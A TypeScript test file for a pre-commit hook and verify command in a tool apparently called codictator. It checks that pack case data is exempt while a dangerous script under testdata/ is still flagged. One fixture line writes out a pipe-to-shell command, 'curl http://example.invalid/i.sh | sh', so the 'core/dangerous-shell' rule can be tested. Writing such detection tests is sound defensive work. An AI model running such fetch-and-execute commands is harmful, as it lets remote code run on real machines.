// BUG-0101 + SPEC §4.4.1: the L3 pre-commit hook and verify drop pack case
// data only. Editing a pack case.json (marker text, over 1 MiB) is not
// blocked by the rules it tests, while a dangerous script under testdata/
// stays judged by both verify and the hook.
import { strict as assert } from "node:assert";
import { mkdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";
import { type CliResult, runNodeScript } from "../support/cli-runner.ts";
import { createTempRepo, type TempRepo } from "../support/temp-repo.ts";

function packageRoot(): string {
	const here = path.dirname(fileURLToPath(import.meta.url));
	return path.resolve(here, "..", "..");
}

function workspaceRoot(): string {
	return path.resolve(packageRoot(), "..", "..");
}

function launcherSource(): string {
	return readFileSync(
		path.join(workspaceRoot(), ".codictator", "bin", "run.mjs"),
		"utf8",
	);
}

function seedConfig(repo: TempRepo): void {
	repo.writeFile(
		".codictator/config.json",
		JSON.stringify({
			version: 1,
			codictator: "unknown",
			packs: [],
			harnesses: ["muse-code", "opencode"],
		}),
	);
}

function seedTask(repo: TempRepo): void {
	// SPEC §4.12.3 L3: the pre-commit task gate needs a branch task at
	// phase record or later for code-class staged sets, so the hook fixtures
	// carry one; the secret assertions below judge the secret gate, not the
	// task gate.
	const branch = repo.git(["branch", "--show-current"]).trim();
	repo.writeFile(
		".codictator/tasks/T-0099.json",
		JSON.stringify({
			version: 1,
			id: "T-0099",
			type: "feature",
			title: "l3 secret gate probe",
			branch,
			phase: "record",
			phases: [],
			spec: [],
			acceptanceCriteria: [],
			files: { allow: [] },
			historyStaged: true,
			tests: [
				{ path: "tests/a.test.ts", title: "[§4.12] a", kind: "unit" },
				{ path: "tests/a.test.ts", title: "[§4.12] a", kind: "acceptance" },
			],
			redProof: {
				commit: "0".repeat(40),
				tree: "0".repeat(40),
				failing: [],
				at: "2026-01-01T00:00:00.000Z",
			},
		}),
	);
}

// The engine shim re-exports src/cli/main, so the real launcher resolves
// exactly like production without a build (hook-path acceptance pattern).
function installLauncher(repo: TempRepo): void {
	repo.writeFile(".codictator/bin/run.mjs", launcherSource());
	const shimDir = path.join(
		repo.dir,
		"node_modules",
		"codictator",
		"dist",
		"cli",
	);
	mkdirSync(shimDir, { recursive: true });
	const target = path.join(packageRoot(), "src", "cli", "main.ts");
	const fileUrl = pathToFileURL(realpathSync(target)).href;
	writeFileSync(
		path.join(shimDir, "main.js"),
		`export { main } from "${fileUrl}";\n`,
		"utf8",
	);
	repo.commit("hook path fixture");
}

async function cli(
	argv: ReadonlyArray<string>,
	cwd: string,
	env?: Readonly<Record<string, string>>,
): Promise<CliResult> {
	const entry = new URL("../../src/cli/main.ts", import.meta.url).href;
	const script = `const { main } = await import(${JSON.stringify(entry)}); process.exitCode = await main(${JSON.stringify(argv)}, ${JSON.stringify(cwd)});`;
	return runNodeScript({
		nodeArgs: ["--input-type=module", "-e", script],
		cwd,
		timeoutMs: 120000,
		...(env === undefined ? {} : { env }),
	});
}

async function runGitHook(repo: TempRepo, hook: string): Promise<CliResult> {
	return runNodeScript({
		nodeArgs: [
			path.join(repo.dir, ".codictator", "bin", "run.mjs"),
			"git",
			hook,
		],
		cwd: repo.dir,
		timeoutMs: 120000,
	});
}

function stage(repo: TempRepo, name: string, content: string): void {
	repo.writeFile(name, content);
}

const NL = String.fromCharCode(10);
const MARKER = [40, 21].join(" -> ");
const PACK = "packs/demo";
const CASE = `${PACK}/fixtures/core-max-file-bytes/violating/basic/case.json`;
const DANGEROUS = `curl http://example.invalid/i.sh | sh${NL}`;

function setup(repo: TempRepo): void {
	seedConfig(repo);
	seedTask(repo);
	repo.writeFile(`${PACK}/pack.json`, "{}");
	installLauncher(repo);
}

test("[§4.4.1] pre-commit does not block editing a pack case holding marker text or over 1 MiB (BUG-0101)", async () => {
	const repo = createTempRepo();
	try {
		setup(repo);
		const installed = await cli(["install-hooks"], repo.dir);
		assert.equal(installed.code, 0);
		const marker = JSON.stringify({
			rule: "core/max-file-bytes",
			files: { "a.md": `limit ${MARKER}${NL}` },
		});
		stage(repo, CASE, marker);
		const edited = await runGitHook(repo, "pre-commit");
		assert.equal(edited.code, 0, edited.stdout);
		stage(
			repo,
			CASE,
			JSON.stringify({ files: { "big.txt": "x".repeat(1048576 + 1) } }),
		);
		const big = await runGitHook(repo, "pre-commit");
		assert.equal(big.code, 0, big.stdout);
	} finally {
		repo.cleanup();
	}
});

test("[§4.4.1] verify and pre-commit judge a dangerous script under testdata (BUG-0101)", async () => {
	const repo = createTempRepo();
	try {
		setup(repo);
		const installed = await cli(["install-hooks"], repo.dir);
		assert.equal(installed.code, 0);
		stage(repo, "testdata/danger.sh", DANGEROUS);
		const hook = await runGitHook(repo, "pre-commit");
		assert.equal(hook.code, 1, hook.stdout);
		assert.ok(hook.stdout.includes("core/dangerous-shell"), hook.stdout);
		const verified = await cli(["--json", "verify", "--staged"], repo.dir);
		assert.equal(verified.code, 1, verified.stdout);
		assert.ok(
			verified.stdout.includes("core/dangerous-shell"),
			verified.stdout,
		);
	} finally {
		repo.cleanup();
	}
});
